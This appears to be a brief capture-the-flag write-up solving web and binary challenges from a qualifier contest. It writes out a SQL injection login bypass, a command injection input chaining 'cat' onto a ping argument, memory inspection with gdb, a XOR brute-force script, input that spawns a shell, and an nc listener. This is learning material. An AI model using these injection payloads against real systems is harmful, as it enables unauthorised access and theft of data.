# SSS_Qualifiers_v12

##### 2025 Edition

- **Web: Qualifiers: Sequel Pro**  
`we use SQL Injection for this as the title suggests`  
`user: admin`  
`pass: ' OR '1' = '1`  
`the secret appears`

- **Web: Qualifiers: Cake**  
`we change the value of the FLAG cookie in applepie`  
`we refresh and we see the cookie updated`  
`it is containing the flag`

- **Web: Qualifiers: Welcome**  
`we look at the source code`  
`first part in:`  
`/static/css/main.css`  
`second part in:`  
`<p id="hidden" style="margin-left:5px;display:inline:float:right">svyr_</p>`  
`third part in:`  
`/static/hidden.js?v=`  
`forth part in:`  
`/static/logo.png`

- **Web: Qualifiers: In Your Face**  
`we look at the source code`  
`<!-- U1NTe2NhZ2VfdHJhdm9sdGF9Cg== -->`  
`we apply base64 on this string`

- **Web: Qualifiers: IP Destroyer**  
`simple command injection to cat the flag.txt`  
`after searching in multiple the directories we find the flag inside /home/ctf/flag`  
`so the input to retrieve the flag is: -c 0 8.8.8.8; cat /home/ctf/flag`

- **Binary: Qualifiers: Black Hole**  
`opened it in IDA`  
`we see that the flag is printed in /dev/null and it is impossible to retrieve it from that address`  
`we use gdb to see the flag before it is written in that file`  
`gdb ./black_hole`  
`gef➤  break fwrite`  
`gef➤  run`  
`gef➤  x/s $rdi`  
`0x602480:       "SSS{the_[REDACTED]_see}"`

- **Binary: Qualifiers: One by One**  
`opened it in Ghidra and than we extract`  
`part20 64h; part0 53h; part24 6Fh; part18 6Fh; part3 7Bh; part27 7Dh; part11 6Fh; part13 5Fh; part23 6Ch; part12 66h; part14 74h; part21 5Fh; part9 70h; part26 6Bh; part17 5Fh; part25 63h; part15 68h; part6 63h; part7 68h; part22 62h; part2 53h; part8 69h; part5 5Fh; part19 6Ch; part4 61h; part16 65h; part1 53h; part10 5Fh`  
`we order them and than we convert them from base64`

- **Binary: Qualifiers: Not Backdoor**  
`the file not_backdoor.exe is a POSIX tar archive (GNU)`  
`we extract the not_backdoor than we analyse the code in IDA`  
`we use the following script to try all XOR possibilities in the function sub_4006B6`  
`orig = [60, 60, 60, 20, 31, 29, 92, 27, 27, 22, 48, 12, 95, 1, 25, 0, 3, 26, 27, 10, 11, 48, 9, 3, 91, 8, 18, 111]`  
`for key in range(256):`  
    `decoded = ''.join(chr(b ^ key) for b in orig)`  
    `print(key, decoded)`  
`there was one result that matched the format starting with SSS and was the flag`

- **Binary: Qualifiers: Mirror Me**  
`opened it in IDA`  
`in max_mirror() function the output is 906609`  
`we choose 2 numbers with the product 906609: 913 and 993, so we can get to system("/bin/sh");`  
`then we search for the flag in the system and we find it in ./home/ctf/flag`

- **Binary: Qualifiers: Pinpoint**  
`opened it in IDA`  
`.data:0000000000601058 v    dd 53535353h`  
`this is the value we need to modify`  
`1398297427 = 0x53585353`  
`initially v is 0x53535353`  
`the four bytes are: at address 0x601058 is 0x53, at address 0x601059 is 0x53, at address 0x60105A is 0x53, at address 0x60105B is 0x53`  
`the only diff between the init value (0x53535353) and the target (0x53585353) is in the third byte (offset 2)`  
`we only need to change that byte`  
`offset 2 so we have to modify at 0x601058 + 2 = 0x60105A`  
`we must change it from 0x53 (83 decimal) to 0x58 (88 decimal)`  
`0x60105A = 6295642`  
`so the inputs are 6295642 and 88`  
`then we search for the flag in the system and we find it in ./home/ctf/flag`

- **Binary: Qualifiers: The Talker**  
`*(_DWORD *)&s.sa_data[2] = htonl(0x7F000001u); -> sends to localhost`  
`*(_WORD *)s.sa_data = htons(4444u); -> sends at port 4444`  
`sleep(10u); -> each 10 seconds`  
`read_flag(buf, 128LL) reads ../flag into a buffer`  
`the binary sends to 127.0.0.1:4444 each 10 seconds using sendto()`  
`we login to connect@141.85.224.99 and we use nc -ul 4444 to listen to 4444 port and we receive the flag`
